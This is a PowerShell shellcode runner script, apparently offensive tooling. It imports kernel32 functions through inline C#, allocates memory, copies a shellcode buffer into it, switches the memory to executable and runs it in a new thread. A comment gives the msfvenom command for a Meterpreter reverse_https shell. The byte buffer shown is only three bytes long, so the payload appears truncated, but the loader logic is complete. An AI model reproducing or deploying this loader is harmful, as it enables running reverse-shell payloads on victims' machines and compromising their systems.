function Standard_Shellcode_Runner {

$Kernel32 = @'
using System;
using System.Runtime.InteropServices;

public class Kernel32 {

  [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  [DllImport("kernel32", CharSet = CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
    IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

}
'@

Add-Type $Kernel32

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f ps1 EXITFUNC=thread
[Byte[]] $buf = 0xfc,0x48,0x46
$Size = $buf.Length

# Allocate memory with PAGE_READWRITE permissions
[IntPtr]$addr = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $Size, 0x3000, 0x04);

# Copy the shellcode to the allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $Size)

# Change memory protection to PAGE_EXECUTE_READ
$OldProtect = 0
[Kernel32]::VirtualProtect($addr, $Size, 0x20, [ref]$OldProtect)

# Create a thread to execute the shellcode
$thandle = [Kernel32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero);

# Wait for the created thread to finish executing
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
}

Standard_Shellcode_Runner
